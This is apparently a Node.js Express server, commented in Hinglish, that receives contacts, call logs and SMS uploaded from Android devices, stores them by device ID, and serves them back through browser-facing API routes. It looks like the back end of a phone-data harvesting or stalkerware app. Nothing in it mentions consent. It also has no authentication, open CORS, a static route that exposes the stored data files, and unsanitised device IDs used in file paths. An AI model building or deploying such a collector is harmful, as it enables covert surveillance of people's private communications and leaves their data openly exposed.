const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();

// Render ke liye Dynamic Port
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// ⚠️ CHANGE: Ab ye 'public' folder nahi dhoondega.
// Ye wahi files dikhayega jahan server.js rakha hai.
app.use(express.static(__dirname));

// Data save karne ke liye folder banana
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR);
}

// ==============================
// 1. DATA UPLOAD (Android se aayega)
// ==============================

// Contacts Upload
app.post('/upload-contacts', (req, res) => {
    const { device_id, contacts_data } = req.body;
    if (!device_id || !contacts_data) return res.status(400).send("Missing Data");

    fs.writeFile(path.join(DATA_DIR, `${device_id}_contacts.json`), contacts_data, (err) => {
        if (err) console.error(err);
        else console.log(`✅ Contacts saved for ${device_id}`);
        res.send("Contacts Saved");
    });
});

// Call Logs Upload
app.post('/upload-call-logs', (req, res) => {
    const { device_id, call_logs } = req.body;
    if (!device_id || !call_logs) return res.status(400).send("Missing Data");

    fs.writeFile(path.join(DATA_DIR, `${device_id}_call_logs.json`), call_logs, (err) => {
        if (err) console.error(err);
        else console.log(`✅ Call Logs saved for ${device_id}`);
        res.send("Call Logs Saved");
    });
});

// SMS Upload
app.post('/upload-sms', (req, res) => {
    const { device_id, sms_data } = req.body;
    if (!device_id || !sms_data) return res.status(400).send("Missing Data");

    fs.writeFile(path.join(DATA_DIR, `${device_id}_sms.json`), sms_data, (err) => {
        if (err) console.error(err);
        else console.log(`✅ SMS saved for ${device_id}`);
        res.send("SMS Saved");
    });
});

// ==============================
// 2. DATA VIEW (Browser ke liye)
// ==============================

app.get('/api/contacts/:deviceId', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_contacts.json`);
    if (fs.existsSync(filePath)) {
        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
    } else {
        res.json([]);
    }
});

app.get('/api/call-logs/:deviceId', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_call_logs.json`);
    if (fs.existsSync(filePath)) {
        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
    } else {
        res.json([]);
    }
});

app.get('/api/sms/:deviceId', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_sms.json`);
    if (fs.existsSync(filePath)) {
        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
    } else {
        res.json([]);
    }
});

// Server Start
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server chalu hai Port ${PORT} par! 🚀`);
});
